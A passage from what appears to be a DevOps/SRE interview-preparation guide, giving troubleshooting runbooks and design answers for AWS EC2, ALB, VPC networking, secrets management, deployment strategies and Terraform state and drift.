- **If Compromised / Crypto-Miner:** Immediately isolate instance: change Security Group to quarantine SG (no outbound/inbound except security audit), capture EBS snapshot for forensics, and terminate.

#### 🎯 Key Architectural Takeaway
> Never reboot an instance blindly. Capture thread dumps and top process telemetry first so you don't lose the smoking gun, and ensure auto-scaling and CPU alarms prevent single-node exhaustion.

#### ⏱️ 60-Second Elevator Pitch Summary

- Check CloudWatch: correlate CPU with NetworkIn and ALB traffic to differentiate traffic surge from rogue process.
- Access instance via SSM Session Manager / SSH; run 'top -c', 'uptime', and 'ps aux --sort=-%cpu | head -10'.
- Check 'vmstat 1 5' for 'us' (app code) vs 'wa' (I/O wait bottleneck) vs 'sy' (kernel context switching).
- Inspect threads with 'top -H -p ' and capture thread dump (jstack/pprof) or strace before killing.
- Mitigate: graceful SIGTERM, scale out ASG, or quarantine if compromised.
- Prevent: CloudWatch Alarm at 75% CPU, ASG auto-scaling, CPU limits (cgroups/Docker), and query optimization.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-3-ec2-running-but-ssh-isn-t-working-layer-by-layer-diagnostics"></a>
### 3. EC2 Running but SSH Isn't Working — Layer-by-Layer Diagnostics

**Level:** `Senior DevOps / SRE` | **Category:** `AWS` • `Networking & Access` | **Type:** `Classic Troubleshooting`

**Tags:** `AWS` `EC2` `SSH` `Security Groups` `VPC`

> **Interview Question:**  
> *"EC2 is running but SSH isn't working — what would you check?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
When SSH fails while EC2 shows 'Running', the very first step is to observe the exact error message: 'Connection timed out' means a networking/firewall block, whereas 'Connection refused' or 'Permission denied' means you reached the OS but sshd or auth failed.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Differentiate Network Timeout vs Connection Refused

Run verbose SSH: `ssh -vvv -i key.pem user@ip` to see where the handshake stalls:

- **Connection Timed Out:** Packet dropped before reaching EC2 (Security Group, Route Table, NACL, or my public IP changed).
- **Connection Refused:** Packet reached the instance, but no process is listening on port 22 (sshd stopped or crashed).
- **Permission Denied (publickey):** Network and sshd are working, but authentication credentials or file permissions failed.

##### 2️⃣ AWS Network & VPC Checks (If Timed Out)

Verify the packet path from internet to instance ENI:

- **Security Group Inbound Rules:** Is port 22 allowed from my current external IP? (Did office VPN or ISP change my public IP?).
- **Public IP & Subnet Route Table:** Does the subnet route table route `0.0.0.0/0` to an **Internet Gateway (IGW)**? (If private subnet, you must connect via Bastion host or AWS Client VPN).
- **Network ACLs (NACL):** Verify NACL allows inbound port 22 AND allows ephemeral ports (1024–65535) outbound for the return traffic.
- **Instance Status Checks:** Check AWS Console: `System Status Check` (AWS hardware) and `Instance Status Check` (OS kernel). If Instance check fails, OS is frozen.

##### 3️⃣ OS, Key Pair & Disk Checks (If Refused or Denied)

Verify host-side configuration and authentication:

- **Key Permissions:** Local private key must have `chmod 400 key.pem` (SSH client rejects overly permissive keys).
- **Correct Username:** Amazon Linux (`ec2-user`), Ubuntu (`ubuntu`), Debian (`admin`), CentOS (`centos`), RHEL (`ec2-user`).
- **Disk Space 100% Full:** If the root EBS disk is 100% full, sshd cannot allocate a PTY session or write to `/var/log/auth.log`, causing instant drops.
- **EC2 System Log / Screenshot:** In AWS Console, select **Actions → Monitor and troubleshoot → Get system log / Get instance screenshot** to see kernel panics or boot errors.

##### 4️⃣ Rescue Strategies Without SSH

How senior SREs regain access when SSH is dead:

- **AWS Systems Manager (SSM) Session Manager:** Connect via browser/CLI (bypasses port 22 and SSH keys entirely using the SSM Agent and IAM role).
- **EC2 Serial Console:** Connect directly to the serial port if enabled on Nitro instances.
- **EBS Volume Detach Rescue:** Stop the EC2 instance, detach the root EBS volume, attach it as a secondary drive to a healthy rescue EC2 instance, mount it, fix `/etc/ssh/sshd_config` or `~/.ssh/authorized_keys`, reattach, and start.

#### 🎯 Key Architectural Takeaway
> Categorize the error immediately: 'Timed out' is AWS network/SG; 'Connection refused' is sshd/port; 'Permission denied' is key/username. Always have AWS SSM Session Manager enabled as a zero-SSH out-of-band management backdoor.

#### ⏱️ 60-Second Elevator Pitch Summary

- Check error type: 'Timed out' = network/firewall; 'Connection refused' = sshd dead; 'Permission denied' = key/user error.
- If timed out: Check Security Group IP whitelist, subnet route table (IGW attached), NACLs (ephemeral return ports).
- If refused/hung: Check EC2 Instance Status Check, EC2 console screenshot, and system log for kernel panic or 100% disk.
- If permission denied: Verify key permissions (chmod 400), correct OS username (ec2-user vs ubuntu).
- Rescue path: Use AWS SSM Session Manager (no port 22 needed), or detach EBS root volume to a rescue instance to fix config.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-4-alb-starts-returning-5xx-errors-identifying-root-cause"></a>
### 4. ALB Starts Returning 5xx Errors — Identifying Root Cause

**Level:** `Senior DevOps / SRE` | **Category:** `AWS` • `Load Balancing` | **Type:** `High-Severity Incident`

**Tags:** `AWS` `ALB` `CloudWatch` `Target Groups` `HTTP 502`

> **Interview Question:**  
> *"ALB starts returning 5xx errors — how would you identify the root cause?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
When an ALB starts throwing 5xx errors, my immediate first goal is to differentiate between errors generated by the ALB itself versus errors generated by backend application targets.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ CloudWatch Metrics Differentiation (ELB vs Target)

Look at CloudWatch metrics for the ALB immediately:

- `HTTPCode_ELB_5XX_Count`: The ALB itself generated the error before receiving a response from targets (502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout).
- `HTTPCode_Target_5XX_Count`: The backend application generated a 5xx response (e.g. unhandled 500 internal server error or database crash), and the ALB simply forwarded it to the client.
- `HealthyHostCount` / `UnHealthyHostCount`: Check if backend targets are failing health checks.

##### 2️⃣ Diagnose Specific 5xx Error Codes

Apply targeted root cause analysis based on status code:

- **HTTP 502 (Bad Gateway):** Target closed the TCP connection before sending full HTTP headers. Classic cause: **Keep-Alive timeout mismatch** (backend web server keep-alive must be set GREATER than ALB idle timeout, e.g. backend 65s vs ALB 60s).
- **HTTP 503 (Service Unavailable):** No healthy targets available in the Target Group (all targets failed health checks), or ALB capacity exceeded during extreme traffic spikes.
- **HTTP 504 (Gateway Timeout):** Target took longer to respond than the ALB idle timeout. Check for slow database queries, thread pool exhaustion, or locked worker processes.
- **HTTP 500 (Target Generated):** Application code threw an uncaught exception, or database/Redis connection failed.

##### 3️⃣ Query ALB Access Logs with Amazon Athena

Analyze ALB S3 access logs to extract exact failing requests, targets, and response times:

- Check `elb_status_code` vs `target_status_code`.
- Check `target_processing_time`: If high (>30s), target application is hanging.
- Identify offending request paths, client IPs, or specific unhealthy backend target IP addresses.

##### 4️⃣ Remediate and Safeguard

Immediate mitigation and permanent safeguards:

- If 503 (unhealthy targets): Inspect target health check path (e.g. `/healthz`) in Target Group. Are targets returning 404 or failing DB ping?
- If 502: Align keep-alive timeout: set Nginx/Node.js/Gunicorn keep-alive to 65s+ and ALB timeout to 60s.
- If 504: Temporarily bump ALB idle timeout to relieve immediate pressure while developers optimize slow DB queries.
- Configure CloudWatch Alarms on `HTTPCode_ELB_5XX_Count > 10` with SNS to PagerDuty.

#### 🎯 Key Architectural Takeaway
> Always split ELB 5xx from Target 5xx in CloudWatch first. If it's ELB 502, check Keep-Alive timeout mismatches; if 503, check Target Group healthy host count; if 504, check target processing latency.

#### ⏱️ 60-Second Elevator Pitch Summary

- Check CloudWatch: HTTPCode_ELB_5XX (ALB fault) vs HTTPCode_Target_5XX (app fault).
- If Target 5XX: App is throwing 500s; inspect app logs and database connectivity.
- If ELB 502: Target closed TCP prematurely; fix Keep-Alive timeout (backend keep-alive must exceed ALB 60s).
- If ELB 503: Zero healthy targets in Target Group; verify health check path (/healthz) and target capacity.
- If ELB 504: Gateway timeout; target query took >60s. Check target_processing_time and database locks.
- Query ALB Access Logs via Athena to isolate failing URLs, client IPs, and specific target instance IDs.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-5-app-works-internally-but-not-from-internet-network-tracing"></a>
### 5. App Works Internally but Not from Internet — Network Tracing

**Level:** `Senior DevOps / SRE` | **Category:** `AWS` • `VPC & Networking` | **Type:** `Networking & Security`

**Tags:** `AWS` `VPC` `Route 53` `Internet Gateway` `Security Groups`

> **Interview Question:**  
> *"Application works internally but not from the internet — how would you troubleshoot?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Since the application works internally, the compute instance and software service are healthy. The failure is strictly along the ingress network path between the public internet and the AWS VPC.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ DNS & IP Resolution (Outside-in Step 1)

Verify public DNS mapping from an external workstation:

- Run `dig +short app.example.com` and `nslookup app.example.com`.
- Does it resolve to a public IP or ALB CNAME? (Common mistake: Route 53 public hosted zone was not updated, or only a private hosted zone exists).
- Is the resolved public IP reachable via `traceroute` or `curl -Iv https://app.example.com`?

##### 2️⃣ Entry Point Topology & Subnet Routing (Step 2)

Verify the Internet Gateway and subnet routing tables:

- **Is the ALB / Gateway in a Public Subnet?** A public subnet must have a Route Table entry pointing `0.0.0.0/0 → igw-xxxx` (Internet Gateway). If an ALB is mistakenly placed in private subnets, internet packets cannot reach it.
- **Public IPv4 Addressing:** If accessing an EC2 instance directly, does it have an Elastic IP (EIP) or auto-assigned public IP?
- **NAT Gateway Confusion:** NAT Gateways only enable outbound egress from private subnets to internet; they DO NOT accept inbound ingress from the internet.

##### 3️⃣ Firewalls: Security Groups & NACLs (Step 3)

Inspect AWS stateful and stateless firewall layers:

- **ALB Security Group:** Must allow inbound ports 80/443 from `0.0.0.0/0` (Internet).
- **Backend EC2 Security Group:** Must allow traffic from the ALB's Security Group ID (chained SG reference).
- **Network ACLs (NACL):** Must have an allow rule for inbound 80/443, AND allow outbound ephemeral return traffic on ports 1024–65535.

##### 4️⃣ AWS WAF & Target Group Binding (Step 4)

Check perimeter protection and target routing:

- **AWS WAF:** Check if an attached Web ACL is blocking requests due to IP rate limits, geographic blocking, or SQLi false positives (look for 403 Forbidden in WAF metrics).
- **Target Group Binding:** Ensure the target group has healthy registered instances and correct port mappings.

#### 🎯 Key Architectural Takeaway
> Trace outside-in: DNS -> Internet Gateway & Route Table -> Public Subnet ALB -> Security Group (80/443 from 0.0.0.0/0) -> NACLs (ephemeral return) -> WAF. Internal working proves compute is fine; focus purely on the AWS ingress pipeline.

#### ⏱️ 60-Second Elevator Pitch Summary

- Check DNS: dig app.example.com to verify public resolution to ALB CNAME / Elastic IP.
- Check Route Table: ensure ALB is in public subnets with route 0.0.0.0/0 -> Internet Gateway (IGW).
- Check Security Groups: ALB SG must allow 80/443 from 0.0.0.0/0; instance SG must allow traffic from ALB SG.
- Check NACLs: ensure stateless NACLs permit both inbound 80/443 and outbound ephemeral ports (1024-65535).
- Check AWS WAF: inspect blocked requests in WAF console for geo-blocking or rate-limit blocks.
- Use AWS VPC Reachability Analyzer to mathematically prove the network path between IGW and instance.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-6-secure-secrets-management-in-ci-cd-production"></a>
### 6. Secure Secrets Management in CI/CD & Production

**Level:** `Senior DevOps / SRE` | **Category:** `CI/CD` • `Security & Compliance` | **Type:** `DevSecOps`

**Tags:** `Security` `HashiCorp Vault` `AWS Secrets Manager` `SOPS` `External Secrets`

> **Interview Question:**  
> *"How would you securely manage secrets?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Secure secrets management requires defense-in-depth across three stages: in Git repositories (at rest), during CI/CD execution (in transit), and inside production runtime environments.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Pillar 1: Never Commit Plaintext Secrets to Git

Enforce strict pre-commit and repository-level prevention:

- **Pre-commit Hooks & Secret Scanning:** Run `git-secrets`, `TruffleHog`, or GitHub Secret Scanning to block commits containing API keys, private certs, or AWS tokens.
- **Encrypted In-Repo Secrets (GitOps):** If secrets must be stored in Git for GitOps, use **Mozilla SOPS** (encrypted with AWS KMS / GCP KMS) or **Bitnami Sealed Secrets** (asymmetric public key encryption).

##### 2️⃣ Pillar 2: Centralized Secrets Store of Record

Use dedicated secret management services:

- Store canonical secrets in **AWS Secrets Manager**, **AWS SSM Parameter Store**, or **HashiCorp Vault**.
- Enable **automated rotation** for database passwords and API tokens.
- Enforce IAM least privilege and audit every secret read with AWS CloudTrail / Vault audit logs.

##### 3️⃣ Pillar 3: Runtime Injection into Kubernetes

How applications consume secrets securely in production:

- **External Secrets Operator (ESO):** Best practice — synchronizes secrets from AWS Secrets Manager / Vault into native Kubernetes Secrets declaratively.
- **Secrets Store CSI Driver:** Mounts secrets directly from AWS Secrets Manager into container memory volumes without creating native K8s Secret objects.
- **Cluster Security:** Enable **etcd encryption-at-rest** using KMS provider to ensure raw secrets aren't stored unencrypted on disk.

##### 4️⃣ Pillar 4: CI/CD Pipeline Hygiene

Protecting secrets during automated builds:

- Use **OIDC (OpenID Connect)**: GitHub Actions / GitLab CI authenticates to AWS via IAM roles without long-lived static AWS access keys!
- Mask all environment variables in pipeline logs.
- Scoped permissions: Pipeline runners should only have access to secrets needed for build/deploy, never admin credentials.

#### 🎯 Key Architectural Takeaway
> Store secrets in AWS Secrets Manager / Vault, inject into K8s via External Secrets Operator, encrypt in Git using SOPS, use OIDC for CI/CD instead of static keys, and encrypt etcd at rest.

#### ⏱️ 60-Second Elevator Pitch Summary

- Repository level: Block secrets with TruffleHog / pre-commit hooks; use SOPS/KMS if storing in GitOps repos.
- Storage of record: AWS Secrets Manager / HashiCorp Vault with automated rotation and CloudTrail audit logging.
- Kubernetes integration: Use External Secrets Operator (ESO) or Secrets Store CSI driver; enable etcd encryption-at-rest.
- CI/CD pipeline: Eliminate static AWS keys using OIDC federated IAM roles; mask all secrets in logs.
- Access control: Enforce strict RBAC on K8s secrets; disable automountServiceAccountToken where not needed.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-7-implementing-blue-green-vs-canary-deployments-in-production"></a>
### 7. Implementing Blue-Green vs Canary Deployments in Production

**Level:** `Senior DevOps / SRE` | **Category:** `CI/CD` • `Deployment Strategies` | **Type:** `Architecture & CD`

**Tags:** `CI/CD` `Canary` `Blue-Green` `Argo Rollouts` `Istio`

> **Interview Question:**  
> *"How would you implement Blue-Green/Canary deployment?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Both strategies aim for zero downtime, but they serve different risk profiles: Blue-Green is all-or-nothing environment switching, while Canary is progressive, metric-driven traffic shifting.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Implementing Canary Deployments (Progressive Delivery)

Deploy new version alongside stable, route a small percentage of real traffic:

- **Tooling:** **Argo Rollouts** or **Flagger** integrated with an Ingress controller (NGINX, ALB, or Istio service mesh).
- **Traffic Step Plan:** Route 5% traffic → wait 5 minutes → 20% → 50% → 100%.
- **Automated Analysis (AnalysisTemplate):** During each step, Argo Rollouts queries Prometheus for metrics: `HTTP error rate &lt; 1%` and `p99 latency &lt; 250ms`.
- **Automatic Rollback:** If error rate spikes, the controller automatically aborts and restores 100% traffic to the stable version without human intervention.

##### 2️⃣ Implementing Blue-Green Deployments (Environment Isolation)

Maintain two identical production environments (Blue = Live, Green = Idle):

- **Step 1:** Deploy new release to Green environment. Zero production user traffic hits Green yet.
- **Step 2:** Run comprehensive automated smoke tests, health checks, and synthetic user journeys against Green.
- **Step 3 (Traffic Flip):** Update the router (Kubernetes Service selector, ALB weighted target group, or Route 53 weighted record) to point 100% traffic to Green.
- **Step 4:** Keep Blue running for 30–60 minutes as an instant zero-downtime rollback target. Once stability is proven, decommission or repurpose Blue.

##### 3️⃣ Database Schema Strategy for Both

How to handle databases when two different application versions run simultaneously:

- In both Canary and Blue-Green, old and new versions run concurrently against the same production database.
- You must use the **Expand and Contract** pattern: Schema migrations must be backward-compatible with the old version.
- Never drop or rename columns in the same release as application updates.

#### 🎯 Key Architectural Takeaway
> Canary uses Argo Rollouts/Flagger for metric-driven progressive traffic shifting (5% -> 100%). Blue-Green uses dual environments with a router flip. Both require backward-compatible Expand/Contract database schemas.

#### ⏱️ 60-Second Elevator Pitch Summary

- Canary: Progressive rollout using Argo Rollouts or Flagger. Incremental traffic shift (5% -> 20% -> 100%) with Prometheus metric analysis for auto-rollback.
- Blue-Green: Dual identical environments. Deploy to Green, run smoke tests, flip Service selector or ALB Target Group weight, keep Blue alive for fast rollback.
- Traffic Routing: Managed at Ingress/Service Mesh layer (Istio, NGINX Ingress, or AWS ALB weighted target groups).
- Database requirement: Backward-compatible Expand/Contract schema migrations to support both versions running concurrently.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-8-terraform-plan-shows-unexpected-changes-investigation-steps"></a>
### 8. terraform plan Shows Unexpected Changes — Investigation Steps

**Level:** `Senior DevOps / SRE` | **Category:** `Terraform` • `State & Drift` | **Type:** `IaC Troubleshooting`

**Tags:** `Terraform` `State Drift` `Plan Diff` `AWS Provider` `Forces Replacement`

> **Interview Question:**  
> *"terraform plan shows unexpected changes — what would you investigate?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
When 'terraform plan' shows unexpected changes — especially destruction or in-place modifications — my absolute first rule is: STOP. Do not run 'terraform apply'. Investigate the diff systematically.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Analyze the Diff & Action Symbols

Read the exact plan output carefully:

- `~ update in-place`: Non-destructive attribute change.
- `-/+ replace (forces replacement)`: **High danger** — Terraform must DESTROY the existing resource and recreate a new one! Look for the `# ... forces replacement` comment next to the specific attribute that triggered it (e.g. EC2 AMI change, VPC CIDR, or EBS volume type).
- `- destroy`: Resource is being deleted because it was removed from code or renamed.

##### 2️⃣ Check for Out-of-Band State Drift

Did someone modify the cloud resource manually in the AWS Console or CLI?

- Run: `terraform plan -refresh-only`.
- This compares the Terraform state file directly against real-world cloud infrastructure without proposing changes to match the code.
- If `-refresh-only` shows drift: Someone touched the resource out-of-band.
- Check **AWS CloudTrail**: Filter event history by resource name to identify who modified the resource, when, and via which API call.

##### 3️⃣ Provider Upgrades & Variable Drift

Inspect underlying dependencies:

- **Provider Version Changes:** Check `.terraform.lock.hcl`. Did a provider update (e.g. AWS provider v5.0 → v5.2) change default attributes, deprecate tags, or modify schema defaults?
- **Variable & tfvars Mismatch:** Was a different `.tfvars` file passed? Did an engineer override variables via `TF_VAR_*` environment variables?
- **Dynamic Inputs:** Is code using dynamic functions like `timestamp()` or `uuid()` that produce new diffs on every single run?

##### 4️⃣ Resolve and Prevent Recurrence

How to resolve safely:

- If code was renamed: Use `moved { from = ... to = ... }` blocks (Terraform 1.1+) instead of destroying and recreating!
- If manual change was intentional: Update Terraform code to match reality, run `terraform apply -refresh-only`.
- If manual change was rogue: Run `terraform apply` to overwrite manual changes and restore code enforcement.
- Add `lifecycle { prevent_destroy = true }` to critical databases and VPCs.

#### 🎯 Key Architectural Takeaway
> Never apply an unexpected plan. Look for '# forces replacement' flags. Run 'terraform plan -refresh-only' to isolate cloud drift from code changes, and check CloudTrail for out-of-band console edits.

#### ⏱️ 60-Second Elevator Pitch Summary

- Freeze: Do not apply. Inspect plan diff for '~' (in-place) vs '-/+' (destroy and recreate - forces replacement).
- Isolate drift: Run 'terraform plan -refresh-only' to identify out-of-band manual changes in AWS Console.
- Check CloudTrail: Identify who modified the resource outside Terraform and when.
- Check provider & variables: Check '.terraform.lock.hcl' for provider upgrades and verify correct .tfvars file.
- Use moved blocks: If refactoring, use 'moved' blocks to prevent destroy/recreate cycles.
- Safeguards: Add 'lifecycle { prevent_destroy = true }' on critical production resources.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-9-someone-manually-changes-terraform-infrastructure-what-happens"></a>
### 9. Someone Manually Changes Terraform Infrastructure — What Happens?

**Level:** `Senior DevOps / SRE` | **Category:** `Terraform` • `Governance & Drift` | **Type:** `IaC Governance`

**Tags:** `Terraform` `Drift Detection` `CloudTrail` `State` `IAM`

> **Interview Question:**  
> *"Someone manually changes Terraform-managed infrastructure — what happens?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
This is known as 'Configuration Drift'. What happens depends on whether the resource was modified, added, or deleted, and when the next Terraform execution runs.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ What Happens During Next Terraform Run

During the next `terraform plan` or `apply`, Terraform performs a refresh:

- **State Refresh:** Terraform queries the cloud provider API (e.g. AWS API) for all resources tracked in `terraform.tfstate`.
- **If a tracked resource was modified manually:** Terraform compares the real-world state against the code. It flags drift and proposes an in-place update to **revert the resource back to the code definition**.
- **If a tracked resource was deleted manually:** Terraform state detects the missing resource and proposes **recreating it from scratch**.
- **If unmanaged sub-resources were added manually:** For example, someone manually added tags or security group rules: Depending on resource arguments, Terraform may delete the extra rules, ignore them, or fail with conflict errors.

##### 2️⃣ Two Remediation Paths

The team must choose between restoring code or adopting the change:

- **Path A (Enforce Code / Revert Drift):** Run `terraform apply`. Terraform will overwrite the manual console changes and restore the infrastructure to the version-controlled state of truth.
- **Path B (Adopt the Manual Change into Code):** If the manual change was an emergency hotfix: update the `.tf` code to match the new configuration, run `terraform plan` to verify 0 proposed changes, and commit the code.

##### 3️⃣ How to Prevent It from Happening Again

Enterprise governance safeguards:

- **Remove Write Access in Production:** Developers and DevOps engineers should have `ReadOnlyAccess` in the AWS Production Console. Only the CI/CD pipeline's IAM role should have write permissions.
- **Automated Drift Detection:** Run a scheduled daily CI/CD pipeline (e.g. at 2 AM) executing `terraform plan -detailed-exitcode`. If exit code is 2 (drift detected), send an automated alert to Slack/PagerDuty.
- **Use SCPs (Service Control Policies):** Enforce AWS Organizations SCPs preventing direct edits to mission-critical VPC, IAM, or KMS resources.

#### 🎯 Key Architectural Takeaway
> On next run, Terraform detects drift during refresh and proposes reverting the manual change back to match code. Prevent it by removing AWS console write access and running automated daily drift detection in CI.

#### ⏱️ 60-Second Elevator Pitch Summary

- What happens: On next 'terraform plan', refresh detects divergence between cloud reality and state. Terraform proposes reverting manual edits to match code.
- If resource deleted manually: Terraform proposes recreating it.
- Remediation: Either 'terraform apply' to overwrite manual changes, or update code to match reality and commit.
- Root prevention: Restrict IAM - zero human write access in Production AWS Console; only CI/CD IAM role has write access.
- Detection: Schedule daily automated 'terraform plan -detailed-exitcode' in CI; alert team on exit code 2 (drift).

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-10-managing-terraform-state-for-multiple-engineers-enterprise-architecture"></a>
### 10. Managing Terraform State for Multiple Engineers — Enterprise Architecture

**Level:** `Senior DevOps / SRE` | **Category:** `Terraform` • `State & Collaboration` | **Type:** `Architecture & Best Practices`

**Tags:** `Terraform` `S3` `DynamoDB` `State Locking` `Remote Backend`

> **Interview Question:**  
> *"How would you manage state for multiple engineers?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
Managing Terraform state across a team requires eliminating local state files completely. We use a secure remote backend with distributed locking, encryption, versioning, and execution isolation.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ AWS S3 + DynamoDB Remote Backend

The industry standard remote backend configuration:

- **Amazon S3 Bucket:** Stores the `terraform.tfstate` file centrally.
- **S3 Bucket Versioning:** MUST be enabled. If an engineer or corrupt apply corrupts state, you can roll back to previous state versions instantly.
- **Encryption at Rest:** Enforce `AES256` or `aws:kms` server-side encryption.
- **DynamoDB State Locking:** Table with Primary Key `LockID` (String). When an engineer runs plan/apply, Terraform acquires a lock. If another engineer tries to apply simultaneously, Terraform outputs: `Error: Error acquiring the state lock`, preventing race conditions and state corruption.

##### 2️⃣ State Decomposition & Blast Radius Reduction

Never put all infrastructure into a single monolithic state file:

- Split state by **Layer**: `networking/` (VPC), `compute/` (EKS), `data/` (RDS), `security/` (IAM).
- Split state by **Environment**: Dev, Staging, and Prod must NEVER share a state file.
- **Benefits:** Smaller state files execute 10x faster, team members don't lock each other out, and a mistake in a compute resource cannot destroy the VPC.

##### 3️⃣ Execute Through CI/CD (Atlantis / Terraform Cloud)

Engineers should not run 'apply' from local laptops:

- Use **Atlantis**, **Terraform Cloud**, or **GitHub Actions**.
- Engineers open a Pull Request. Atlantis automatically runs `terraform plan` and comments the plan diff directly on the PR.
- Once reviewed and approved by senior engineers, someone types `atlantis apply` in PR comments. The execution happens strictly in CI with an audit log.

##### 4️⃣ State Security & Sensitive Data

Protecting secrets inside state:

- Terraform state contains plaintext sensitive values (e.g. generated DB passwords).
- Lock down S3 bucket with strict bucket policy allowing access ONLY to the CI/CD execution role.
- Block all public S3 bucket access.

#### 🎯 Key Architectural Takeaway
> Use S3 with versioning and KMS encryption for state storage, DynamoDB for distributed locking, split state by layer and environment, and execute applies exclusively through CI/CD (Atlantis/PR workflow).

#### ⏱️ 60-Second Elevator Pitch Summary

- Remote Backend: S3 bucket with versioning (enables rollback of corrupt state) and KMS encryption.
- State Locking: DynamoDB table with LockID key to prevent concurrent apply race conditions.
- Decomposition: Split state by layer (network, compute, database) and environment (dev, staging, prod) to limit blast radius.
- Access Control: S3 bucket policy allowing only CI/CD IAM role; block public access (state stores plaintext secrets).
- Team Workflow: Run plan/apply via Atlantis or CI/CD PR workflow rather than individual local laptops.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-11-design-a-high-availability-cloud-infrastructure-for-millions-of-requests-day"></a>
### 11. Design a High-Availability Cloud Infrastructure for Millions of Requests/Day

**Level:** `Staff / Principal SRE` | **Category:** `System Design` • `Cloud Architecture & Scalability` | **Type:** `Premium Architecture`

**Tags:** `System Design` `AWS` `EKS` `Architecture` `Aurora`

> **Interview Question:**  
> *"Design a highly available, production-grade cloud infrastructure for a microservices application handling millions of requests per day. Explain your choices around networking, load balancing, autoscaling, databases, observability, security, and disaster recovery."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
To support millions of daily requests with 99.99% availability, the architecture is designed around multi-AZ redundancy, zero single points of failure, decoupling of state, automated progressive scaling, and zero-trust security.

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Networking & Edge Load Balancing

Multi-layered ingress and defense-in-depth perimeter:

- **Edge Acceleration & Perimeter:** Amazon CloudFront for global content delivery, SSL termination, and static caching, paired with **AWS WAF** (OWASP Top 10 rules, rate-limiting, bot control) and **AWS Shield** for DDoS protection.
- **VPC Topology:** Multi-AZ VPC spanning 3 Availability Zones (AZs) with three subnet tiers: Public Subnets (ALB, NAT Gateways), Private Subnets (EKS compute nodes), and Isolated Database Subnets (no internet route).
- **Load Balancing Layer:** Public Application Load Balancer (ALB) distributing traffic across EKS worker nodes, handing off to an in-cluster Ingress Controller (NGINX or AWS Load Balancer Controller) using IP target mode (bypasses kube-proxy hop directly to pod IPs via AWS VPC CNI).

##### 2️⃣ Compute Layer & Elastic Autoscaling

High-density, cost-effective container orchestration:

- **Managed Control Plane:** Amazon EKS spanning 3 AZs for resilient API availability.
- **Fast Node Provisioning (Karpenter):** Replace slow Cluster Autoscaler with **Karpenter** for just-in-time EC2 provisioning (graviton/spot/on-demand mix) in <45 seconds based on pending pod requests.
- **Multi-Tier Workload Autoscaling:** Horizontal Pod Autoscaler (HPA) coupled with **KEDA** (Kubernetes Event-driven Autoscaling) to scale on custom business metrics (e.g. SQS queue backlog, Redis queue length, or HTTP RPS) before CPU saturates.
- **HA Scheduling Safeguards:** `topologySpreadConstraints` across AZs and `PodDisruptionBudgets (PDBs)` to guarantee minimum healthy replicas during rolling updates or node drains.

##### 3️⃣ Databases, Caching & Data Layer

Decoupling hot reads, writes, and cache tiers:

- **Relational Database:** **Amazon Aurora PostgreSQL (Multi-AZ)** with a primary writer instance and auto-scaling Read Replicas across AZs. Aurora provides storage auto-replication across 6 storage nodes and sub-30s failover.
- **Caching Tier:** **Amazon ElastiCache for Redis (Cluster Mode)** with multi-AZ replication. Implements cache-aside pattern for hot user queries and session state, absorbing 80%+ read traffic from the database.
- **NoSQL / Event Streaming:** Amazon DynamoDB with on-demand capacity for ultra-low latency key-value lookups; Amazon MSK (Managed Kafka) or SQS for asynchronous event-driven inter-service messaging.

##### 4️⃣ Zero-Trust Security & Secrets

Hardening at rest, in transit, and across identities:

- **Workload Identity:** IAM Roles for Service Accounts (IRSA) — pods assume scoped AWS IAM roles without long-lived credentials.
- **Secrets Management:** AWS Secrets Manager integrated via **External Secrets Operator (ESO)** with automatic password rotation; etcd encryption-at-rest via AWS KMS.
- **Network Segmentation:** Calico/Cilium NetworkPolicies enforcing default-deny ingress/egress between microservice namespaces.
